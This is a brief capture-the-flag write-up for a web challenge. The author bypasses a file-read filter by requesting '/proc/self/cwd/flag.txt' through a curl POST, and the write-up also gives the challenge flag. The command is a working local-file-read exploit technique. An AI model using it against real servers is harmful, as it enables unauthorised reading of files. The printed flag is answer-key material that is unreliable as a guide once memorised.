# Baby Session Forger (I got junior firstblood)
## Challenge
- **Solves**: 19
- **Name**: Baby session forger
- **Points**: 116

## Description
I forgot to make it so I could auth myself. And now I’m locked out, please help me recover my flag:  
[babysessionforger.hkn](babysessionforger.hkn)  

**Handout SHA256**:  
`00F8469063A5D72BD49443BD4F02CF72476FC7F65BFED1740FC71FCA0ACB137D`

**NOTE**: Create a user and find the VPN and Browser LABs on Campfire Labs

## Solution
The idea is to bypass the simple "don’t read files in /app" check by referencing the file in a different way. I used this command:  
```bash
curl -X POST babysessionforger.hkn/fileread -d "filename=/proc/self/cwd/flag.txt&offset=0&amount=100"
```

## Flag
`DDC{P4th_s4n1t1z4t10n_d0n3_wrong}`